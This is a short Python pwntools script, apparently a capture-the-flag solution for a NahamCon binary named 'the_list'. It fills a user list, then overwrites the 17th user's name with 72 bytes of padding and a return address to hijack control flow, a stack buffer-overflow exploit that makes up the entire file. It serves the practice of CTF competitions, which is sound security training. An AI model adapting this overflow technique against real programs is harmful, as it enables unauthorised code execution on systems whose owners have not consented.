from pwn import *

def main():
    context.log_level = 'DEBUG'
    io = process('./the_list')
    io = remote('challenge.nahamcon.com', 31980)

    context(os='linux', arch='amd64')

    io.sendlineafter('Enter your name: ', 'A')
    for i in range(16):
        io.sendlineafter('> ', '2')
        io.sendlineafter("Enter the user's name: ", 'A')
    
    padding = "A" * 72
    payload = "\x69\x13\x40\x00\x00\x00\x00"
    payload = padding + payload

    io.sendlineafter('> ', '4')
    io.sendlineafter('What is the number for the user whose name you want to change? ', '17')
    io.sendlineafter("What is the new user's name? ", payload)

    io.sendlineafter('> ', '5')
    io.recvline()

    

if __name__ == '__main__':
    main()

